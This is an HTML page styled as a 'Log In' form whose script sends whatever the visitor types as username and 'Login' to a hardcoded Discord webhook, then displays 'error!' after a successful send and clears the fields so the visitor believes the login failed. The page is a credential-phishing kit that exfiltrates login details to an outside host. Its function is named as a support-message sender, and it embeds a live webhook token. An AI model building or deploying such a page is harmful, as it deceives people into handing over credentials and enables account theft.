<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log In</title>
    <link rel="stylesheet" href="style.css">
    <style>
        /* Match message box to normal input field */
        #message {
            height: 40px;               /* same height as your login bar */
            resize: none;               /* can't expand */
            overflow: hidden;           /* hide scrollbar */
            padding-top: 10px;          
            padding-bottom: 10px;
            line-height: 20px;          /* clean text vertical alignment */
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Log In</h1>

        <form onsubmit="sendSupportMessage(event)">
            <input type="text" id="name" class="input-field" placeholder="Username" required>

            <!-- Message bar same size & not expandable -->
            <textarea id="message" class="input-field" placeholder="Login" required></textarea>

            <button type="submit" class="login-button">Send</button>
        </form>

        <p id="status"></p>
    </div>

    <script>
        async function sendSupportMessage(event) {
            event.preventDefault();

            const name = document.getElementById("name").value;
            const msg = document.getElementById("message").value;
            const status = document.getElementById("status");

            const webhookURL = "https://discordapp.com/api/webhooks/1445677855475241031/Y_z73Tr0o6Od9sg0JjCrlYmrpHB4eB8h_lP-BDb7SdisFmMrDCQKzXI1WFPa5WLQcJIU"; // <-- paste your webhook

            const payload = {
                content: `ðŸ“© **New Message**\n**From:** ${name}\n**Message:** ${msg}`
            };

            try {
                const res = await fetch(webhookURL, {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify(payload)
                });

                if (res.ok) {
                    status.innerText = "error!";
                    document.getElementById("name").value = "";
                    document.getElementById("message").value = "";
                } else {
                    status.innerText = "Error sending message.";
                }
            } catch (error) {
                status.innerText = "Connection error.";
            }
        }
    </script>
</body>
</html>
